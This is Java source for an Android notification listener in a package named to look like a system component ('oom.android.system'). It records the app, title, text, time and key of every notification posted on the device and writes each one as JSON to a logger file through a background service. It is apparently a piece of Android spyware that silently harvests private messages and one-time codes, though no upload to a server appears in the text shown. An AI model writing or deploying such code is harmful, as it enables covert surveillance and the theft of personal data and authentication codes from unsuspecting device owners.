package oom.android.system.Managers.Listeners;

import org.json.JSONException;
import org.json.JSONObject;

import android.app.Notification;
import android.os.Bundle;
import android.os.IBinder;

import android.content.Intent;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;

import oom.android.system.Managers.base;
import oom.android.system.Settings.TypeOpenFile;
import oom.android.system.app.MyService;

import static oom.android.system.app.MyService.OpenFile;

public class NotificationListener extends NotificationListenerService{



    @Override
    public IBinder onBind(Intent intent) {
        return super.onBind(intent);
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn){
        try {
            String appName = sbn.getPackageName();
            String title = sbn.getNotification().extras.getString(Notification.EXTRA_TITLE);
            CharSequence contentCs = sbn.getNotification().extras.getCharSequence(Notification.EXTRA_TEXT);
            String content = "";
            if(contentCs != null) content = contentCs.toString();
            long postTime = sbn.getPostTime();
            String uniqueKey = sbn.getKey();

            JSONObject data = new JSONObject();
            data.put(base.NOTOFICATIONS.APP_NAME, appName);
            data.put(base.NOTOFICATIONS.TITLE, title);
            data.put(base.NOTOFICATIONS.CONTENT, "" + content);
            data.put(base.NOTOFICATIONS.POST_TIME, postTime);
            data.put(base.NOTOFICATIONS.KEY, uniqueKey);
            MyService.writeFile(TypeOpenFile.NotificationLogger,data.toString());
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }


}
